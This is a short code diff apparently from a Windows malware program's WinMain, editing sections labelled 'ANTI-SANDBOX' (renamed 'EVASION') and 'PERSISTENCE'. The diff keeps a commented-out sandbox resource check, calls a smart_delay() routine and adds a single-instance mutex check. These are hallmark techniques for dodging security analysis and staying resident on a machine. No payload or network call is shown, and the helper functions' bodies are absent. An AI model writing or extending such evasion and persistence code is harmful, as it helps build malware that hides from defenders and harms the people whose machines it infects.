@@ -8,15 +8,19 @@
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
-    // 1. ANTI-SANDBOX
-
+    // 1. EVASION
 /*
 TODO: FIX RESOURCE CHECK
     if (!check_resources()) {
         return 0;
     }
 */  
+
     smart_delay();
+
+    if (!check_mutex()) {
+        return 0;
+    }
 
     // 2. PERSISTENCE
 
